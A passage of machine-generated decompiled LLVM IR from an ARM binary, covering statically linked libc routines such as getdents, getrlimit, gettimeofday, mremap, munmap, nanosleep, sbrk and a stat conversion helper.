  %v0_14d40 = load i32, i32* @r1, align 4
  store i32 %v0_14d40, i32* @r3, align 4
  store i32 197, i32* %r7.global-to-local, align 4
  %v0_14d50 = load i32, i32* @r0, align 4
  store i32 %v0_14d50, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_14d50, -4095
  br i1 %tmp, label %dec_label_pc_14d78, label %dec_label_pc_14d5c

dec_label_pc_14d5c:                               ; preds = %entry
  %v0_14d60 = call i32 @__aeabi_read_tp()
  %v3_14d64 = load i16, i16* @global_var_21a38.351, align 2
  %v4_14d64 = sext i16 %v3_14d64 to i32
  store i32 %v4_14d64, i32* @r3, align 4
  %v0_14d68 = load i32, i32* @r2, align 4
  %v1_14d68 = sub i32 0, %v0_14d68
  store i32 %v1_14d68, i32* @r2, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v3_14d70 = add i32 %v4_14d64, %v0_14d60
  %v4_14d70 = inttoptr i32 %v3_14d70 to i32*
  store i32 %v1_14d68, i32* %v4_14d70, align 4
  br label %dec_label_pc_14d88

dec_label_pc_14d78:                               ; preds = %entry
  store i32 %v0_14d50, i32* %r7.global-to-local, align 4
  %v2_14d78 = icmp eq i32 %v0_14d50, 0
  br i1 %v2_14d78, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_14d78
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_14d78, %bb
  call void @__pseudo_cond_branch(i1 %v2_14d78, i32 ptrtoint (i32* @global_var_151c8.582 to i32))
  br label %dec_label_pc_14d88

dec_label_pc_14d88:                               ; preds = %dec_label_pc_14d5c, %.thread
  %v0_14d88 = load i32, i32* %r7.global-to-local, align 4
  ret i32 %v0_14d88

; uselistorder directives
  uselistorder i32 %v0_14d50, { 1, 2, 0, 3 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_14d88, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__getdents(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %v6_14d9c = load i32, i32* @r5, align 4
  %v18_14d9c = load i32, i32* @sl, align 4
  store i32 141, i32* %r7.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_14dd4, label %dec_label_pc_14db8

dec_label_pc_14db8:                               ; preds = %entry
  %v1_14dbc = sub i32 0, %arg1
  %v3_14dc0 = load i16, i16* @global_var_21a38.351, align 2
  %v4_14dc0 = sext i16 %v3_14dc0 to i32
  store i32 %v4_14dc0, i32* %r3.global-to-local, align 4
  %v0_14dc4 = call i32 @__aeabi_read_tp()
  store i32 -1, i32* @r5, align 4
  %v3_14dcc = add i32 %v4_14dc0, %v0_14dc4
  %v4_14dcc = inttoptr i32 %v3_14dcc to i32*
  store i32 %v1_14dbc, i32* %v4_14dcc, align 4
  br label %dec_label_pc_14e28

dec_label_pc_14dd4:                               ; preds = %entry
  br i1 false, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_14dd4
  store i32 %arg2, i32* %r7.global-to-local, align 4
  %v3_14ddc = add i32 %arg2, %arg1
  store i32 %v3_14ddc, i32* @sl, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_14dd4, %bb
  %v1_14e184 = phi i32 [ %v18_14d9c, %dec_label_pc_14dd4 ], [ %v3_14ddc, %bb ]
  %v0_14e142 = phi i32 [ 141, %dec_label_pc_14dd4 ], [ %arg2, %bb ]
  br i1 false, label %dec_label_pc_14e28, label %dec_label_pc_14e14

dec_label_pc_14de8:                               ; preds = %dec_label_pc_14e14
  %v1_14e1c = inttoptr i32 %v1_14e14 to i8*
  %v1_14de8 = add i32 %v0_14de8, 8
  %v2_14de8 = inttoptr i32 %v1_14de8 to i16*
  %v3_14de8 = load i16, i16* %v2_14de8, align 2
  %v4_14de8 = zext i16 %v3_14de8 to i32
  %v2_14dec = add i32 %v4_14de8, %v0_14de8
  store i32 %v2_14dec, i32* @r3, align 4
  %v1_14df0 = add i32 %v2_14dec, -1
  %v2_14df0 = inttoptr i32 %v1_14df0 to i8*
  %v3_14df0 = load i8, i8* %v2_14df0, align 1
  %v4_14df0 = zext i8 %v3_14df0 to i32
  store i32 %v4_14df0, i32* @r4, align 4
  %v3_14df4 = call i32 @strlen(i8* %v1_14e1c)
  %v0_14df8 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_14df8, i32* @r1, align 4
  %v1_14dfc = add i32 %v3_14df4, 1
  store i32 %v1_14dfc, i32* @r2, align 4
  %v0_14e00 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_14e00, i32* @r0, align 4
  %v3_14e04 = call i32 @memmove(i32 %v0_14e00, i32 %v0_14df8, i32 %v1_14dfc)
  %v0_14e08 = load i32, i32* %r7.global-to-local, align 4
  %v1_14e08 = add i32 %v0_14e08, 8
  %v2_14e08 = inttoptr i32 %v1_14e08 to i16*
  %v3_14e08 = load i16, i16* %v2_14e08, align 2
  %v4_14e08 = zext i16 %v3_14e08 to i32
  store i32 %v4_14e08, i32* %r3.global-to-local, align 4
  %v0_14e0c = load i32, i32* @r4, align 4
  %v1_14e0c = trunc i32 %v0_14e0c to i8
  %v3_14e0c = add i32 %v0_14e08, 10
  %v4_14e0c = inttoptr i32 %v3_14e0c to i8*
  store i8 %v1_14e0c, i8* %v4_14e0c, align 1
  %v0_14e10 = load i32, i32* %r7.global-to-local, align 4
  %v1_14e10 = load i32, i32* %r3.global-to-local, align 4
  %v2_14e10 = add i32 %v1_14e10, %v0_14e10
  store i32 %v2_14e10, i32* %r7.global-to-local, align 4
  %v1_14e18.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_14e14

dec_label_pc_14e14:                               ; preds = %.thread, %dec_label_pc_14de8
  %v1_14e18 = phi i32 [ %v1_14e18.pre, %dec_label_pc_14de8 ], [ %v1_14e184, %.thread ]
  %v0_14de8 = phi i32 [ %v2_14e10, %dec_label_pc_14de8 ], [ %v0_14e142, %.thread ]
  %v1_14e14 = add i32 %v0_14de8, 10
  store i32 %v1_14e14, i32* %r6.global-to-local, align 4
  %v3_14e18 = icmp ult i32 %v0_14de8, %v1_14e18
  %v1_14e20 = add i32 %v0_14de8, 11
  store i32 %v1_14e20, i32* %r8.global-to-local, align 4
  br i1 %v3_14e18, label %dec_label_pc_14de8, label %dec_label_pc_14e28

dec_label_pc_14e28:                               ; preds = %dec_label_pc_14e14, %.thread, %dec_label_pc_14db8
  %v0_14e28 = load i32, i32* @r5, align 4
  store i32 %v6_14d9c, i32* @r5, align 4
  store i32 %v18_14d9c, i32* @sl, align 4
  ret i32 %v0_14e28

; uselistorder directives
  uselistorder i32 %v1_14e14, { 1, 0 }
  uselistorder i32 %v0_14de8, { 2, 4, 3, 1, 0 }
  uselistorder i32 %v18_14d9c, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 3, 1, 4 }
  uselistorder i32* %r6.global-to-local, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @memmove, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_14e14, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_14e40 = ptrtoint i32* %stack_var_-16 to i32
  %v2_14e4c = call i32 @getrlimit(i32 7, i32 %v2_14e40)
  %v1_14e50 = icmp slt i32 %v2_14e4c, 0
  %v5_14e54 = load i32, i32* %stack_var_-16, align 4
  %storemerge = select i1 %v1_14e50, i32 256, i32 %v5_14e54
  ret i32 %storemerge
}

define i32 @getegid() local_unnamed_addr {
entry:
  %v1_14e78 = load i32, i32* @r0, align 4
  ret i32 %v1_14e78
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %v1_14e8c = load i32, i32* @r0, align 4
  ret i32 %v1_14e8c
}

define i32 @getgid(i32 %arg1) local_unnamed_addr {
entry:
  %v1_14ea0 = load i32, i32* @r0, align 4
  ret i32 %v1_14ea0
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v4_14eb0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 148) to i32*), align 4
  %v1_14eb4 = inttoptr i32 %v4_14eb0 to i32*
  %v2_14eb4 = load i32, i32* %v1_14eb4, align 4
  %v2_14eb8 = icmp eq i32 %v2_14eb4, 0
  br i1 %v2_14eb8, label %bb, label %bb2

bb:                                               ; preds = %entry
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v1_14ec0 = phi i32 [ %v2_14eb4, %entry ], [ 4096, %bb ]
  ret i32 %v1_14ec0

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_14ef8, label %dec_label_pc_14ee0

dec_label_pc_14ee0:                               ; preds = %entry
  %v1_14ee4 = sub i32 0, %arg1
  %v3_14ee8 = load i16, i16* @global_var_21a38.351, align 2
  %v4_14ee8 = sext i16 %v3_14ee8 to i32
  %v0_14eec = call i32 @__aeabi_read_tp()
  %v3_14ef0 = add i32 %v4_14ee8, %v0_14eec
  %v4_14ef0 = inttoptr i32 %v3_14ef0 to i32*
  store i32 %v1_14ee4, i32* %v4_14ef0, align 4
  br label %dec_label_pc_14ef8

dec_label_pc_14ef8:                               ; preds = %entry, %dec_label_pc_14ee0
  %v1_14efc = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_14ee0 ]
  ret i32 %v1_14efc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14ef8, { 1, 0 }
}

define i32 @gettimeofday(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14f04 = load i32, i32* @r7, align 4
  store i32 %v3_14f04, i32* %stack_var_-8, align 4
  %v0_14f10 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_14f10, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14f10, -4095
  br i1 %tmp, label %dec_label_pc_14f38, label %dec_label_pc_14f20

dec_label_pc_14f20:                               ; preds = %entry
  %v0_14f24 = call i32 @__aeabi_read_tp()
  %v3_14f28 = load i16, i16* @global_var_21a38.351, align 2
  %v4_14f28 = sext i16 %v3_14f28 to i32
  store i32 %v4_14f28, i32* @r3, align 4
  %v0_14f2c = load i32, i32* %r2.global-to-local, align 4
  %v1_14f2c = sub i32 0, %v0_14f2c
  store i32 %v1_14f2c, i32* %r2.global-to-local, align 4
  %v3_14f30 = add i32 %v4_14f28, %v0_14f24
  %v4_14f30 = inttoptr i32 %v3_14f30 to i32*
  store i32 %v1_14f2c, i32* %v4_14f30, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_14f38.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_14f38

dec_label_pc_14f38:                               ; preds = %entry, %dec_label_pc_14f20
  %v1_14f3c = phi i32 [ %v0_14f10, %entry ], [ -1, %dec_label_pc_14f20 ]
  %v2_14f38 = phi i32 [ %v3_14f04, %entry ], [ %v2_14f38.pre, %dec_label_pc_14f20 ]
  store i32 %v2_14f38, i32* @r7, align 4
  ret i32 %v1_14f3c

; uselistorder directives
  uselistorder i32 %v0_14f10, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14f38, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %v1_14f54 = load i32, i32* @r0, align 4
  ret i32 %v1_14f54
}

define i32 @mremap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_14f58 = load i32, i32* @r4, align 4
  store i32 %v3_14f58, i32* %stack_var_-12, align 4
  %v0_14f68 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_14f68, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14f68, -4095
  br i1 %tmp, label %dec_label_pc_14f90, label %dec_label_pc_14f78

dec_label_pc_14f78:                               ; preds = %entry
  %v0_14f7c = call i32 @__aeabi_read_tp()
  %v3_14f80 = load i16, i16* @global_var_21a38.351, align 2
  %v4_14f80 = sext i16 %v3_14f80 to i32
  %v0_14f84 = load i32, i32* %r2.global-to-local, align 4
  %v1_14f84 = sub i32 0, %v0_14f84
  store i32 %v1_14f84, i32* %r2.global-to-local, align 4
  %v3_14f88 = add i32 %v4_14f80, %v0_14f7c
  %v4_14f88 = inttoptr i32 %v3_14f88 to i32*
  store i32 %v1_14f84, i32* %v4_14f88, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_14f90.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_14f90

dec_label_pc_14f90:                               ; preds = %entry, %dec_label_pc_14f78
  %v1_14f94 = phi i32 [ %v0_14f68, %entry ], [ -1, %dec_label_pc_14f78 ]
  %v2_14f90 = phi i32 [ %v3_14f58, %entry ], [ %v2_14f90.pre, %dec_label_pc_14f78 ]
  store i32 %v2_14f90, i32* @r4, align 4
  ret i32 %v1_14f94

; uselistorder directives
  uselistorder i32 %v0_14f68, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14f90, { 1, 0 }
}

define i32 @munmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14f9c = load i32, i32* @r7, align 4
  store i32 %v3_14f9c, i32* %stack_var_-8, align 4
  %v0_14fa8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_14fa8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14fa8, -4095
  br i1 %tmp, label %dec_label_pc_14fd0, label %dec_label_pc_14fb8

dec_label_pc_14fb8:                               ; preds = %entry
  %v0_14fbc = call i32 @__aeabi_read_tp()
  %v3_14fc0 = load i16, i16* @global_var_21a38.351, align 2
  %v4_14fc0 = sext i16 %v3_14fc0 to i32
  %v0_14fc4 = load i32, i32* %r2.global-to-local, align 4
  %v1_14fc4 = sub i32 0, %v0_14fc4
  store i32 %v1_14fc4, i32* %r2.global-to-local, align 4
  %v3_14fc8 = add i32 %v4_14fc0, %v0_14fbc
  %v4_14fc8 = inttoptr i32 %v3_14fc8 to i32*
  store i32 %v1_14fc4, i32* %v4_14fc8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_14fd0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_14fd0

dec_label_pc_14fd0:                               ; preds = %entry, %dec_label_pc_14fb8
  %v1_14fd4 = phi i32 [ %v0_14fa8, %entry ], [ -1, %dec_label_pc_14fb8 ]
  %v2_14fd0 = phi i32 [ %v3_14f9c, %entry ], [ %v2_14fd0.pre, %dec_label_pc_14fb8 ]
  store i32 %v2_14fd0, i32* @r7, align 4
  ret i32 %v1_14fd4

; uselistorder directives
  uselistorder i32 %v0_14fa8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14fd0, { 1, 0 }
}

define i32 @__syscall_nanosleep() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14fdc = load i32, i32* @r7, align 4
  store i32 %v3_14fdc, i32* %stack_var_-8, align 4
  %v0_14fe8 = load i32, i32* @r0, align 4
  store i32 %v0_14fe8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14fe8, -4095
  br i1 %tmp, label %dec_label_pc_15010, label %dec_label_pc_14ff8

dec_label_pc_14ff8:                               ; preds = %entry
  %v0_14ffc = call i32 @__aeabi_read_tp()
  %v3_15000 = load i16, i16* @global_var_21a38.351, align 2
  %v4_15000 = sext i16 %v3_15000 to i32
  %v0_15004 = load i32, i32* %r2.global-to-local, align 4
  %v1_15004 = sub i32 0, %v0_15004
  store i32 %v1_15004, i32* %r2.global-to-local, align 4
  %v3_15008 = add i32 %v4_15000, %v0_14ffc
  %v4_15008 = inttoptr i32 %v3_15008 to i32*
  store i32 %v1_15004, i32* %v4_15008, align 4
  %v2_15010.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_15010

dec_label_pc_15010:                               ; preds = %entry, %dec_label_pc_14ff8
  %v1_15014 = phi i32 [ %v0_14fe8, %entry ], [ -1, %dec_label_pc_14ff8 ]
  %v2_15010 = phi i32 [ %v3_14fdc, %entry ], [ %v2_15010.pre, %dec_label_pc_14ff8 ]
  store i32 %v2_15010, i32* @r7, align 4
  ret i32 %v1_15014

; uselistorder directives
  uselistorder i32 %v0_14fe8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15010, { 1, 0 }
}

define i32 @__libc_nanosleep(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v4_15028 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 12800) to i32*), align 4
  %v2_1502c = icmp eq i32 %v4_15028, 0
  %v3_15030 = load i32, i32* @r4, align 4
  %v9_15030 = load i32, i32* @r6, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_1502c, label %dec_label_pc_15040, label %entry.dec_label_pc_15048_crit_edge

entry.dec_label_pc_15048_crit_edge:               ; preds = %entry
  br label %dec_label_pc_15048

dec_label_pc_15040:                               ; preds = %entry
  store i32 %v3_15030, i32* @r4, align 4
  store i32 %v9_15030, i32* @r6, align 4
  %v0_15044 = call i32 @__syscall_nanosleep()
  br label %dec_label_pc_15048

dec_label_pc_15048:                               ; preds = %entry.dec_label_pc_15048_crit_edge, %dec_label_pc_15040
  %v0_15048 = call i32 @__libc_enable_asynccancel()
  %v0_1504c = load i32, i32* @r6, align 4
  store i32 %v0_1504c, i32* @r1, align 4
  store i32 %v0_15048, i32* @r5, align 4
  %v0_15054 = load i32, i32* @r4, align 4
  store i32 %v0_15054, i32* @r0, align 4
  %v0_15058 = call i32 @__syscall_nanosleep()
  store i32 %v0_15058, i32* @r4, align 4
  %v0_15060 = load i32, i32* @r5, align 4
  %v1_15064 = call i32 @__libc_disable_asynccancel(i32 %v0_15060)
  %v0_15068 = load i32, i32* @r4, align 4
  ret i32 %v0_15068

; uselistorder directives
  uselistorder i32 (i32)* @__libc_disable_asynccancel, { 3, 8, 13, 1, 5, 4, 6, 7, 12, 2, 11, 10, 9, 0 }
  uselistorder i32 ()* @__libc_enable_asynccancel, { 3, 8, 13, 1, 5, 4, 6, 7, 12, 2, 11, 10, 9, 0 }
  uselistorder label %dec_label_pc_15048, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1507c = load i32, i32* @r4, align 4
  store i32 %v3_1507c, i32* %stack_var_-16, align 4
  store i32 11576, i32* %r6.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32* %r4.global-to-local, align 4
  %v4_1508c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 11576) to i32*), align 4
  %v2_15090 = icmp eq i32 %v4_1508c, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_15090, label %dec_label_pc_1509c, label %dec_label_pc_150ac

dec_label_pc_1509c:                               ; preds = %entry
  %v1_150a0 = call i32 @__GI_brk(i32 0)
  %v1_150a4 = icmp slt i32 %v1_150a0, 0
  br i1 %v1_150a4, label %dec_label_pc_150d0, label %dec_label_pc_150acthread-pre-split

dec_label_pc_150acthread-pre-split:               ; preds = %dec_label_pc_1509c
  %v0_150b0.pr = load i32, i32* %r5.global-to-local, align 4
  %v0_150ac.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_150ac.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_150ac

dec_label_pc_150ac:                               ; preds = %dec_label_pc_150acthread-pre-split, %entry
  %v1_150ac = phi i32 [ %v1_150ac.pre, %dec_label_pc_150acthread-pre-split ], [ 11576, %entry ]
  %v0_150ac = phi i32 [ %v0_150ac.pre, %dec_label_pc_150acthread-pre-split ], [ ptrtoint (i32* @global_var_219e0.355 to i32), %entry ]
  %v1_150c0 = phi i32 [ %v0_150b0.pr, %dec_label_pc_150acthread-pre-split ], [ %arg1, %entry ]
  %v2_150ac = add i32 %v0_150ac, %v1_150ac
  %v3_150ac = inttoptr i32 %v2_150ac to i32*
  %v4_150ac = load i32, i32* %v3_150ac, align 4
  %v2_150b0 = icmp eq i32 %v1_150c0, 0
  store i32 %v4_150ac, i32* %r4.global-to-local, align 4
  br i1 %v2_150b0, label %dec_label_pc_150d4, label %dec_label_pc_150bc

dec_label_pc_150bc:                               ; preds = %dec_label_pc_150ac
  %v2_150c0 = add i32 %v4_150ac, %v1_150c0
  %v1_150c4 = call i32 @__GI_brk(i32 %v2_150c0)
  %v1_150c8 = icmp slt i32 %v1_150c4, 0
  br i1 %v1_150c8, label %dec_label_pc_150d0, label %dec_label_pc_150bc.dec_label_pc_150d4_crit_edge

dec_label_pc_150bc.dec_label_pc_150d4_crit_edge:  ; preds = %dec_label_pc_150bc
  %v0_150d4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_150d4

dec_label_pc_150d0:                               ; preds = %dec_label_pc_150bc, %dec_label_pc_1509c
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_150d4

dec_label_pc_150d4:                               ; preds = %dec_label_pc_150ac, %dec_label_pc_150bc.dec_label_pc_150d4_crit_edge, %dec_label_pc_150d0
  %v0_150d4 = phi i32 [ %v0_150d4.pre, %dec_label_pc_150bc.dec_label_pc_150d4_crit_edge ], [ -1, %dec_label_pc_150d0 ], [ %v4_150ac, %dec_label_pc_150ac ]
  %v2_150d8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_150d8, i32* @r4, align 4
  ret i32 %v0_150d4

; uselistorder directives
  uselistorder i32 %v4_150ac, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_150d4, { 2, 1, 0 }
}

define i32 @times(i32 %arg1) local_unnamed_addr {
entry:
  %v1_150f8 = load i32, i32* @r0, align 4
  ret i32 %v1_150f8
}

define i32 @__xstat64_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_150fc = load i32, i32* @r4, align 4
  store i32 %v3_150fc, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 104, i32* %r2.global-to-local, align 4
  %v3_15114 = inttoptr i32 %arg2 to i8*
  %v4_15114 = call i32 @__GI_memset(i8* %v3_15114, i32 0, i32 104)
  %v2_15118 = load i32, i32* %arg1, align 4
  store i32 %v2_15118, i32* %r3.global-to-local, align 4
  %v3_15118 = add i32 %tmp, 4
  %v4_15118 = inttoptr i32 %v3_15118 to i32*
  %v5_15118 = load i32, i32* %v4_15118, align 4
  store i32 %v5_15118, i32* %r4.global-to-local, align 4
  %v0_1511c = load i32, i32* %r5.global-to-local, align 4
  %v1_1511c = inttoptr i32 %v0_1511c to i32*
  store i32 %v2_15118, i32* %v1_1511c, align 4
  %v3_1511c = add i32 %v0_1511c, 4
  %v4_1511c = inttoptr i32 %v3_1511c to i32*
  %v5_1511c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1511c, i32* %v4_1511c, align 4
  %v0_15120 = load i32, i32* %r6.global-to-local, align 4
  %v1_15120 = add i32 %v0_15120, 12
  %v2_15120 = inttoptr i32 %v1_15120 to i32*
  %v3_15120 = load i32, i32* %v2_15120, align 4
  %v1_15124 = load i32, i32* %r5.global-to-local, align 4
  %v2_15124 = add i32 %v1_15124, 12
  %v3_15124 = inttoptr i32 %v2_15124 to i32*
  store i32 %v3_15120, i32* %v3_15124, align 4
  %v0_15128 = load i32, i32* %r6.global-to-local, align 4
  %v1_15128 = add i32 %v0_15128, 96
  store i32 %v1_15128, i32* %r3.global-to-local, align 4
  %v1_1512c = inttoptr i32 %v1_15128 to i32*
  %v2_1512c = load i32, i32* %v1_1512c, align 4
  store i32 %v2_1512c, i32* %r3.global-to-local, align 4
  %v3_1512c = add i32 %v0_15128, 100
  %v4_1512c = inttoptr i32 %v3_1512c to i32*
  %v5_1512c = load i32, i32* %v4_1512c, align 4
  store i32 %v5_1512c, i32* %r4.global-to-local, align 4
  %v1_15130 = add i32 %v0_15128, 56
  %v2_15130 = inttoptr i32 %v1_15130 to i32*
  %v3_15130 = load i32, i32* %v2_15130, align 4
  store i32 %v3_15130, i32* %r2.global-to-local, align 4
  %v1_15134 = load i32, i32* %r5.global-to-local, align 4
  %v2_15134 = add i32 %v1_15134, 96
  %v3_15134 = inttoptr i32 %v2_15134 to i32*
  store i32 %v2_1512c, i32* %v3_15134, align 4
  %v0_15138 = load i32, i32* %r4.global-to-local, align 4
  %v1_15138 = load i32, i32* %r5.global-to-local, align 4
  %v2_15138 = add i32 %v1_15138, 100
  %v3_15138 = inttoptr i32 %v2_15138 to i32*
  store i32 %v0_15138, i32* %v3_15138, align 4
  %v0_1513c = load i32, i32* %r6.global-to-local, align 4
  %v1_1513c = add i32 %v0_1513c, 24
  store i32 %v1_1513c, i32* %ip.global-to-local, align 4
  %v1_15140 = inttoptr i32 %v1_1513c to i32*
  %v2_15140 = load i32, i32* %v1_15140, align 4
  store i32 %v2_15140, i32* %ip.global-to-local, align 4
  %v3_15140 = add i32 %v0_1513c, 28
  %v4_15140 = inttoptr i32 %v3_15140 to i32*
  %v5_15140 = load i32, i32* %v4_15140, align 4
  store i32 %v5_15140, i32* %lr.global-to-local, align 4
  %v0_15144 = load i32, i32* %r2.global-to-local, align 4
  %v1_15144 = load i32, i32* %r5.global-to-local, align 4
  %v2_15144 = add i32 %v1_15144, 56
  %v3_15144 = inttoptr i32 %v2_15144 to i32*
  store i32 %v0_15144, i32* %v3_15144, align 4
  %v0_15148 = load i32, i32* %r6.global-to-local, align 4
  %v1_15148 = add i32 %v0_15148, 72
  store i32 %v1_15148, i32* %r3.global-to-local, align 4
  %v1_1514c = add i32 %v0_15148, 32
  store i32 %v1_1514c, i32* %r7.global-to-local, align 4
  %v1_15150 = inttoptr i32 %v1_1514c to i32*
  %v2_15150 = load i32, i32* %v1_15150, align 4
  store i32 %v2_15150, i32* %r7.global-to-local, align 4
  %v3_15150 = add i32 %v0_15148, 36
  %v4_15150 = inttoptr i32 %v3_15150 to i32*
  %v5_15150 = load i32, i32* %v4_15150, align 4
  store i32 %v5_15150, i32* %r8.global-to-local, align 4
  %v1_15154 = inttoptr i32 %v1_15148 to i32*
  %v2_15154 = load i32, i32* %v1_15154, align 4
  %v3_15154 = add i32 %v0_15148, 76
  %v4_15154 = inttoptr i32 %v3_15154 to i32*
  %v5_15154 = load i32, i32* %v4_15154, align 4
  store i32 %v5_15154, i32* %r1.global-to-local, align 4
  %v0_15158 = load i32, i32* %r5.global-to-local, align 4
  %v1_15158 = add i32 %v0_15158, 72
  %v1_1515c = inttoptr i32 %v1_15158 to i32*
  store i32 %v2_15154, i32* %v1_1515c, align 4
  %v3_1515c = add i32 %v0_15158, 76
  %v4_1515c = inttoptr i32 %v3_1515c to i32*
  %v5_1515c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1515c, i32* %v4_1515c, align 4
  %v0_15160 = load i32, i32* %r7.global-to-local, align 4
  %v1_15160 = load i32, i32* %r5.global-to-local, align 4
  %v2_15160 = add i32 %v1_15160, 32
  %v3_15160 = inttoptr i32 %v2_15160 to i32*
  store i32 %v0_15160, i32* %v3_15160, align 4
  %v0_15164 = load i32, i32* %r8.global-to-local, align 4
  %v1_15164 = load i32, i32* %r5.global-to-local, align 4
  %v2_15164 = add i32 %v1_15164, 36
  %v3_15164 = inttoptr i32 %v2_15164 to i32*
  store i32 %v0_15164, i32* %v3_15164, align 4
